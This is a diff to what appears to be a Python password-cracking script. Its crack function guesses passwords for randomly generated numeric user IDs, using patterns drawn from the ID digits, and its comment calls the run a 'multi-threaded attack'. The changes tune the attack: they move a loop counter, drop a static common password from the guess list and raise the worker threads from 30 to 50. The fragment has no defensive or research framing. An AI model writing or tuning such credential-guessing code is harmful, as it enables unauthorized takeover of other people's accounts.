@@ -85,7 +85,7 @@ def crack(uid, password_list, total_count):
     # Thread-safe counter increment
     with counter_lock:
         global loop,bkas
-        loop += 1
+        
     
     colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
               "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
@@ -244,7 +244,7 @@ def crack(uid, password_list, total_count):
             else:
                 #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
-                
+        loop += 1
     except requests.exceptions.Timeout:
         #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
         return False
@@ -278,7 +278,6 @@ def get_password_patterns(uid):
         uid[:6],     # First 6 digits
         uid[:8],     # First 8 digits
         uid,         # Full number
-        '57273200',  # Static common password
     ]
 
 def random_number():
@@ -330,7 +329,7 @@ def random_number():
     # Start multi-threaded attack
     start_time = time.time()
     
-    with ThreadPoolExecutor(max_workers=30) as executor:
+    with ThreadPoolExecutor(max_workers=50) as executor:
         futures = []
         
         for random_id in idz:
